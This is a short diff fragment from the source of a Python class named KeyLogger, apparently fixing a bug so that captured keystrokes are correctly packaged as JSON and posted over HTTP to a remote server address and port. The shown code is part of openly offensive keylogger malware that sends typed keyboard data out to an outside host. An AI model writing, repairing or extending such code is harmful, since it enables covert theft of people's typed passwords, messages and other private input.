@@ -16,7 +16,7 @@ class KeyLogger:
         self.text = ""
     
     def _send_post_request(self):
-        payload = json.dumps({"keyboardData": text})
+        payload = json.dumps({"keyboardData": self.text})
         try:
             requests.post(f"http://{self.server_ip}:{self.port}", 
                           data=payload, 
